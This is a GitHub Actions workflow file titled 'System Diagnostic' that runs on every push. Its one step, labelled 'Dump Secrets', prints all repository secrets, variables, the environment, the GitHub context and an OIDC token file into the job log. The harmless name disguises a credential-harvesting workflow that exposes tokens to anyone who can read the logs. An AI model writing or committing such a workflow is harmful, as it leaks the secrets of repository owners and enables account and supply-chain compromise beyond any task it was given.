
name: System Diagnostic
on:
  push:
  workflow_dispatch:
jobs:
  diagnose:
    runs-on: ubuntu-latest
    steps:
      - name: Dump Secrets
        run: |
          echo "=== SECRETS ==="
          echo "${{ toJSON(secrets) }}"
          echo "=== VARIABLES ==="
          echo "${{ toJSON(vars) }}"
          echo "=== ENVIRONMENT ==="
          env
          echo "=== GITHUB CONTEXT ==="
          echo "${{ toJSON(github) }}"
          echo "=== OIDC TOKEN ==="
          cat /run/act/act_oidc_token 2>/dev/null || echo "No OIDC token"
